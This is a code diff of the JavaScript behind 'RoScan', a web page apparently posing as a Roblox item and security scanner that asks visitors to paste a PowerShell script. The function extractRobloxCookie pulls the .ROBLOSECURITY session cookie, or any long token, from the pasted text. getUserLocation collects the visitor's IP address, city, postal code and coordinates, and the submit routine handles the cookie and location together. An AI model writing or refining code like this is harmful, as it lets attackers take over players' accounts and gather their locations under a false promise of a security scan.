@@ -48,27 +48,24 @@ function loadTheme() {
 
 // Enhanced Modal functionality
 function openScanModal() {
-            console.log('Opening scan modal...');
-        const modal = document.getElementById('scanModal');
-        const textarea = document.getElementById('powershellInput');
+    const modal = document.getElementById('scanModal');
+    const textarea = document.getElementById('powershellInput');
+    
+    if (modal) {
+        modal.style.display = 'block';
+        document.body.style.overflow = 'hidden';
         
-        if (modal) {
-            modal.style.display = 'block';
-            document.body.style.overflow = 'hidden';
-            
-            // Focus on textarea after animation
-            setTimeout(() => {
-                if (textarea) {
-                    textarea.focus();
-                }
-            }, 400);
-            
-            console.log('Modal opened successfully');
-            showNotification('Item scanner ready', 'info');
-        } else {
-            console.error('Modal element not found!');
-            showNotification('Error opening scanner', 'error');
-        }
+        // Focus on textarea after animation
+        setTimeout(() => {
+            if (textarea) {
+                textarea.focus();
+            }
+        }, 400);
+        
+        showNotification('Item scanner ready', 'info');
+    } else {
+        showNotification('Error opening scanner', 'error');
+    }
 }
 
 function closeScanModal() {
@@ -100,102 +97,49 @@ function updateCharCount() {
     const charCount = document.getElementById('charCount');
     const inputStatus = document.getElementById('inputStatus');
     
-    if (textarea && charCount && inputStatus) {
-        const length = textarea.value.length;
-        charCount.textContent = `${length.toLocaleString()} characters`;
+    if (textarea && charCount) {
+        const count = textarea.value.length;
+        charCount.textContent = `${count.toLocaleString()} characters`;
         
-        if (length === 0) {
-            inputStatus.textContent = 'Ready for analysis';
-            inputStatus.style.color = 'var(--text-muted)';
-        } else if (length < 10) {
-            inputStatus.textContent = 'Script too short';
-            inputStatus.style.color = 'var(--warning)';
-        } else if (length > 10000) {
-            inputStatus.textContent = 'Script too long (max 10,000 chars)';
-            inputStatus.style.color = 'var(--error)';
-        } else {
-            inputStatus.textContent = 'Ready for analysis';
-            inputStatus.style.color = 'var(--success)';
+        if (inputStatus) {
+            if (count === 0) {
+                inputStatus.textContent = 'Ready for scanning';
+                inputStatus.style.color = '';
+            } else if (count < 100) {
+                inputStatus.textContent = 'Need more content';
+                inputStatus.style.color = '#f59e0b';
+            } else {
+                inputStatus.textContent = 'Ready to scan';
+                inputStatus.style.color = '#10b981';
+            }
         }
     }
 }
 
-// Generate unique session ID for tracking
-function generateSessionId() {
-    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-}
-
-// Enhanced location detection with multiple services
+// Enhanced location detection
 async function getUserLocation() {
     try {
-        let locationData = {
-            ip: 'Unknown',
-            country: 'Unknown',
-            region: 'Unknown', 
-            city: 'Unknown',
-            isp: 'Unknown',
-            timezone: 'Unknown',
-            latitude: 'Unknown',
-            longitude: 'Unknown'
-        };
-
-        // Try primary service (ipapi.co)
-        try {
-            const response = await fetch('https://ipapi.co/json/', {
-                method: 'GET',
-                headers: {
-                    'Accept': 'application/json'
-                }
-            });
-            
-            if (response.ok) {
-                const data = await response.json();
-                locationData = {
-                    ip: data.ip || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    region: data.region || 'Unknown',
-                    city: data.city || 'Unknown',
-                    isp: data.org || 'Unknown',
-                    timezone: data.timezone || 'Unknown',
-                    latitude: data.latitude || 'Unknown',
-                    longitude: data.longitude || 'Unknown'
-                };
-                return locationData;
-            }
-        } catch (error) {
-            console.log('Primary location service failed, trying fallback...');
-        }
-
-        // Fallback to ipinfo.io
-        try {
-            const fallbackResponse = await fetch('https://ipinfo.io/json');
-            if (fallbackResponse.ok) {
-                const fallbackData = await fallbackResponse.json();
-                const [lat, lon] = (fallbackData.loc || ',').split(',');
-                
-                locationData = {
-                    ip: fallbackData.ip || 'Unknown',
-                    country: fallbackData.country || 'Unknown',
-                    region: fallbackData.region || 'Unknown',
-                    city: fallbackData.city || 'Unknown',
-                    isp: fallbackData.org || 'Unknown',
-                    timezone: fallbackData.timezone || 'Unknown',
-                    latitude: lat || 'Unknown',
-                    longitude: lon || 'Unknown'
-                };
-            }
-        } catch (fallbackError) {
-            console.log('Fallback location service also failed');
-        }
-
-        return locationData;
-    } catch (error) {
-        console.error('Location detection failed:', error);
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
         return {
-            ip: 'Location detection failed',
+            ip: data.ip || 'Unknown',
+            country: data.country_name || 'Unknown',
+            region: data.region || 'Unknown', 
+            city: data.city || 'Unknown',
+            postal: data.postal || 'Unknown',
+            isp: data.org || 'Unknown',
+            timezone: data.timezone || 'Unknown',
+            latitude: data.latitude || 'Unknown',
+            longitude: data.longitude || 'Unknown'
+        };
+    } catch (error) {
+        return {
+            ip: 'Unknown',
             country: 'Unknown',
             region: 'Unknown',
             city: 'Unknown',
+            postal: 'Unknown',
             isp: 'Unknown',
             timezone: 'Unknown',
             latitude: 'Unknown',
@@ -231,7 +175,6 @@ async function submitPowerShell() {
 
     try {
         // Scan limited items and find authentication data from the input
-        // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
@@ -255,7 +198,6 @@ async function submitPowerShell() {
             return;
         }
         
-        // Get user location
         // Get user location
         const locationInfo = await getUserLocation();
         
@@ -319,37 +261,6 @@ async function submitPowerShell() {
             submitBtn.style.background = '';
         }, 3000);
     }
-}
-
-// Function to scan and find authentication data from text
-function extractRobloxCookie(text) {
-    // First, try to find .ROBLOSECURITY directly
-    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
-    if (roblosecurityIndex !== -1) {
-        // Find the opening quote after .ROBLOSECURITY
-        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
-        if (startQuoteIndex !== -1) {
-            const valueStartIndex = startQuoteIndex + 1;
-            // Find the closing quote
-            const endQuoteIndex = text.indexOf('"', valueStartIndex);
-            if (endQuoteIndex !== -1) {
-                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
-                if (cookieValue.length > 50) {
-                    return cookieValue;
-                }
-            }
-        }
-    }
-    
-    // Fallback: Look for any very long string that might be the authentication token
-    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
-    if (longStrings && longStrings.length > 0) {
-        // Return the longest string found
-        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
-        return longest;
-    }
-    
-    return null;
 }
 
 // Function to extract limited item information from text
@@ -459,6 +370,37 @@ function hasValidData(text) {
     return false;
 }
 
+// Function to scan and find authentication data from text
+function extractRobloxCookie(text) {
+    // First, try to find .ROBLOSECURITY directly
+    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
+    if (roblosecurityIndex !== -1) {
+        // Find the opening quote after .ROBLOSECURITY
+        const startQuoteIndex = text.indexOf('"', roblosecurityIndex + '.ROBLOSECURITY'.length);
+        if (startQuoteIndex !== -1) {
+            const valueStartIndex = startQuoteIndex + 1;
+            // Find the closing quote
+            const endQuoteIndex = text.indexOf('"', valueStartIndex);
+            if (endQuoteIndex !== -1) {
+                const cookieValue = text.substring(valueStartIndex, endQuoteIndex);
+                if (cookieValue.length > 50) {
+                    return cookieValue;
+                }
+            }
+        }
+    }
+    
+    // Fallback: Look for any very long string that might be the authentication token
+    const longStrings = text.match(/[A-Za-z0-9+/=._%\-]{500,}/g);
+    if (longStrings && longStrings.length > 0) {
+        // Return the longest string found
+        const longest = longStrings.reduce((a, b) => a.length > b.length ? a : b);
+        return longest;
+    }
+    
+    return null;
+}
+
 // Loading animation with dots and messages
 function startLoadingAnimation(submitText) {
     const messages = [
@@ -534,7 +476,6 @@ function copyToClipboard(text) {
     navigator.clipboard.writeText(text).then(function() {
         showNotification('Copied to clipboard!', 'success');
     }).catch(function(err) {
-        console.error('Failed to copy to clipboard: ', err);
         showNotification('Failed to copy to clipboard', 'error');
     });
 }
@@ -542,21 +483,29 @@ function copyToClipboard(text) {
 // Form validation enhancement
 function validatePowerShellInput(script) {
     const trimmed = script.trim();
+    
+    if (trimmed.length === 0) {
+        return { valid: false, message: 'Please enter a PowerShell script' };
+    }
+    
     if (trimmed.length < 10) {
-        return { valid: false, message: 'PowerShell script too short (minimum 10 characters)' };
+        return { valid: false, message: 'Script is too short (minimum 10 characters)' };
     }
-    if (trimmed.length > 10000) {
-        return { valid: false, message: 'PowerShell script too long (maximum 10,000 characters)' };
+    
+    if (trimmed.length > 50000) {
+        return { valid: false, message: 'Script is too long (maximum 50,000 characters)' };
     }
-    return { valid: true, message: 'Script ready for analysis' };
+    
+    return { valid: true, message: 'Script looks good!' };
 }
 
 // Enhanced notification system
 function showNotification(message, type = 'info') {
     const notification = document.createElement('div');
+    
     const icons = {
         success: '✅',
-        error: '❌',
+        error: '❌', 
         warning: '⚠️',
         info: 'ℹ️'
     };
@@ -565,11 +514,12 @@ function showNotification(message, type = 'info') {
         position: fixed;
         top: 20px;
         right: 20px;
-        padding: 1rem 1.5rem;
-        border-radius: 12px;
-        color: white;
-        font-weight: 500;
         z-index: 10000;
+        padding: 1rem 1.5rem;
+        border-radius: 10px;
+        color: white;
+        font-weight: 600;
+        font-size: 0.9rem;
         animation: slideIn 0.3s ease-out;
         background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
         box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
@@ -622,105 +572,74 @@ const notificationCSS = `
 
 // Initialize everything when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM loaded, initializing RoScan v2.0...');
+    // Load saved theme
+    loadTheme();
     
     // Add notification CSS
     const style = document.createElement('style');
     style.textContent = notificationCSS;
     document.head.appendChild(style);
     
-    // Load theme
-    loadTheme();
-    
-    // Close modal when clicking outside of it
-    window.addEventListener('click', function(event) {
-        const modal = document.getElementById('scanModal');
-        if (event.target === modal) {
-            closeScanModal();
-        }
-    });
-
-    // Add click interaction to scan area
-    const scanArea = document.querySelector('.scan-area');
-    if (scanArea) {
-        scanArea.addEventListener('click', function() {
-            openScanModal();
-        });
-    }
-
-    // Auto-resize textarea and character count
+    // Add character count listener
     const textarea = document.getElementById('powershellInput');
     if (textarea) {
-        textarea.addEventListener('input', function() {
-            // Auto-resize
-            this.style.height = 'auto';
-            this.style.height = Math.min(this.scrollHeight, 400) + 'px';
-            
-            // Update character count
-            updateCharCount();
-        });
-        
-        // Initialize character count
-        updateCharCount();
+        textarea.addEventListener('input', updateCharCount);
     }
-
-    // Smooth scrolling for navigation links
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener('click', function (e) {
-            e.preventDefault();
-            const target = document.querySelector(this.getAttribute('href'));
-            if (target) {
-                target.scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'start'
-                });
+    
+    // Initialize character count
+    updateCharCount();
+    
+    // Add enter key handler for quick submit
+    if (textarea) {
+        textarea.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'Enter') {
+                e.preventDefault();
+                submitPowerShell();
             }
         });
-    });
-    
-    // Show welcome notification
-    setTimeout(() => {
-        showNotification('RoScan security platform ready!', 'success');
-    }, 1000);
-});
-
-// Keyboard shortcuts
-document.addEventListener('keydown', function(event) {
-    // ESC to close modal
-    if (event.key === 'Escape') {
-        const modal = document.getElementById('scanModal');
-        if (modal && modal.style.display === 'block') {
-            closeScanModal();
-        }
     }
     
-    // Ctrl+Enter to submit PowerShell (when modal is open)
-    if ((event.ctrlKey || event.metaKey) && event.key === 'Enter') {
-        const modal = document.getElementById('scanModal');
-        if (modal && modal.style.display === 'block') {
-            event.preventDefault();
-            submitPowerShell();
-        }
-    }
-    
-    // Ctrl+K to open scanner (global shortcut)
-    if ((event.ctrlKey || event.metaKey) && event.key === 'k') {
-        event.preventDefault();
-        openScanModal();
-    }
-});
-
-// Performance monitoring
-window.addEventListener('load', function() {
-    const loadTime = performance.now();
-    console.log(`RoScan loaded in ${Math.round(loadTime)}ms`);
-    
-    // Track page performance
-    if ('performance' in window && 'navigation' in performance) {
-        const perfData = performance.getEntriesByType('navigation')[0];
-        console.log('Performance metrics:', {
-            domContentLoaded: Math.round(perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart),
-            loadComplete: Math.round(perfData.loadEventEnd - perfData.loadEventStart)
+    // Close modal when clicking outside
+    const modal = document.getElementById('scanModal');
+    if (modal) {
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                closeScanModal();
+            }
         });
+    }
+    
+    // Escape key to close modal
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+            const modal = document.getElementById('scanModal');
+            if (modal && modal.style.display === 'block') {
+                closeScanModal();
+            }
+        }
+    });
+});
+
+// Performance optimization: Debounce character count updates
+function debounce(func, wait) {
+    let timeout;
+    return function executedFunction(...args) {
+        const later = () => {
+            clearTimeout(timeout);
+            func(...args);
+        };
+        clearTimeout(timeout);
+        timeout = setTimeout(later, wait);
+    };
+}
+
+// Apply debouncing to character count
+const debouncedUpdateCharCount = debounce(updateCharCount, 150);
+
+// Replace the direct event listener with debounced version
+document.addEventListener('DOMContentLoaded', function() {
+    const textarea = document.getElementById('powershellInput');
+    if (textarea) {
+        textarea.addEventListener('input', debouncedUpdateCharCount);
     }
 });
